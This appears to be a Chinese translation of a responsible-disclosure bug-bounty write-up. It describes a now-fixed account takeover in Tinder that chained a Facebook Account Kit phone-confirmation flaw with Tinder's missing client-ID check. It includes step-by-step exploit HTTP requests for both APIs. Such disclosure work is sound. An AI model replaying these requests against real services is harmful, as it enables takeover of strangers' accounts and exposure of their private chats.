***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 ****

[](https://youtu.be/ug5ZuezbD3c)

 **注：该漏洞的披露已经取得Facebook的许可。**

 **本文中提到的漏洞，也已由Facebook和Tinder的安全团队紧急修复。[AppSecure](https://appsecure.in/)
[https://appsecure.in](https://appsecure.in/)是一家专业的网络安全公司，拥有众多经验丰富的网络安全专家。我们能为你的关键业务和数据提供好的解决方案，避免遭受在线和离线以及漏洞的影响。**

## 摘要：

这篇文章是关于Tinder应用程序中发现的一个账户接管漏洞，利用该漏洞攻击者可以访问受害者必须使用手机号码才能登录的的Tinder帐户。这很可能是利用了，最近已被修复的Facebook
kits上的漏洞。

Tinder网站和移动应用程序都允许用户使用他们的手机号码登录。此登录服务由Account Kit（Facebook）提供。

![0_Pl2ybNU6xXSeKDeo_.png](https://image.3001.net/images/20180225/15195210964437.png!small)  

当用户点击
[tinder.com](http://tinder.com/)上的使用手机号码登录后，他们将被重定向到Accountkit.com登录。如果认证成功，Account
Kit将访问令牌传递给Tinder进行登录。

无语的是，Tinder API并没有对Account Kit提供的令牌上的客户端ID做检查。

这使得攻击者可以使用Account Kit提供的任何其他应用的访问令牌，接管其他用户的Tinder帐户。

##  **描述：**

[Account
Kit](http://accountkit.com/)是Facebook的一个产品，它可以让用户快速注册并且支持仅通过手机号或电子邮箱，而无需密码就能登录一些已注册的应用程序。

[Tinder](http://tinder.com/)是的一款基于用户地理位置的手机交友APP。你可以选择“喜欢”、或者选择“跳过”（相当于一次评分）该名推荐对象。假如你喜欢的推荐对象恰好也喜欢你，那么你们就可以互发消息、在
Facebook 上互相关注、组织线下见面等。

Account Kit中存在一个漏洞，攻击者只需使用他们的电话号码即可访问任意用户的Account
Kit账户。一旦成功，攻击者将会窃取cookie（aks）中的Account kit访问令牌。

接着，攻击者就可以使用访问令牌（aks）利用以下帖子中提到的API漏洞登录到用户的Tinder帐户。

##  **利用过程**

1)攻击者通过在“new_phone_number”中输入受害者的手机号码，来登录到受害者的Account Kit账户。问题就出在这，Account
Kit并未对手机号码与OTP。因此，攻击者可以输入任意用户的手机号码，并轻松地登录受害者的Account Kit账户。

然后，攻击者会复制Account kit的访问令牌。

##  **Accountkit API漏洞**

    
    
    POST /update/async/phone/confirm/?dpr=2 HTTP/1.1
    Host: www.accountkit.com
    new_phone_number=[vctim’s phone number]&update_request_code=c1fb2e919bb33a076a7c6fe4a9fbfa97[attacker’s request code]&confirmation_code=258822[attacker’s code]&__user=0&__a=1&__dyn=&__req=6&__be=-1&__pc=PHASED%3ADEFAULT&__rev=3496767&fb_dtsg=&jazoest=

![0_f8qh3mB0PK71sZP__.png](https://image.3001.net/images/20180225/15195211267969.png!small)  

2)现在，攻击者只需在Tinder
API中黏贴受害者的访问令牌“aks”再次请求，即可成功接管目标账户。一旦成功接管，攻击者便可以随意的阅读目标账户的私人聊天记录，完整的个人信息，以及向左或向右滑动其他用户个人资料等。

##  **Tinder API漏洞**

    
    
    POST /v2/auth/login/accountkit?locale=en HTTP/1.1
    Host: api.gotinder.com
    Connection: close
    Content-Length: 185
    Origin: https://tinder.com
    app-version: 1000000
    platform: web
    User-Agent: Mozilla/5.0 (Macintosh)
    content-type: application/json
    Accept: */*
    Referer: https://tinder.com/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    {“token”:”xxx”,”id”:””}

##  **POC视频演示**

<https://youtu.be/tIAxmZt1joY>

##  **回应**

Tinder和Facebook都在第一时间修复了这两个漏洞。Facebook和Tinder分别为此奖励了我5000和1250美元。

 ***参考来源：[medium](https://medium.com/@appsecure/hacking-tinder-accounts-using-facebook-accountkit-d5cc813340d1)，FB小编 secist 编译，转载请注明来自FreeBuf.COM**

